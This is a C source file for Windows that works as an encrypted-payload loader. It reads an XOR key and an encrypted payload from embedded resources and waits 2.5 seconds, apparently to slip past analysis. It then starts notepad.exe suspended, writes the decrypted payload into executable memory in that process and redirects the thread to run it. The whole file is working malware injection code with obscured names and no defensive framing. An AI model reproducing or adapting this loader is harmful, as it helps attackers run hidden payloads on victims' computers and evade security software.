
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void loadResource_with(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
    }
}

int main() {
    Sleep(2500);

    
    char* key101k;
    DWORD key101kLen;
    loadResource_with("dhanushkey1", &key101k, &key101kLen);

    char* code199k;
    DWORD code199kLen;
    loadResource_with("dhanushcode56", &code199k, &code199kLen);

    // Create a new process in a suspended stat
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
      

    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pi.hThread, &ctx);

    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);

    // Write payload to target process
    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
    // Update entry point
    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
    SetThreadContext(pi.hThread, &ctx);

    // Resume thread to execute payload
    ResumeThread(pi.hThread); 

    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
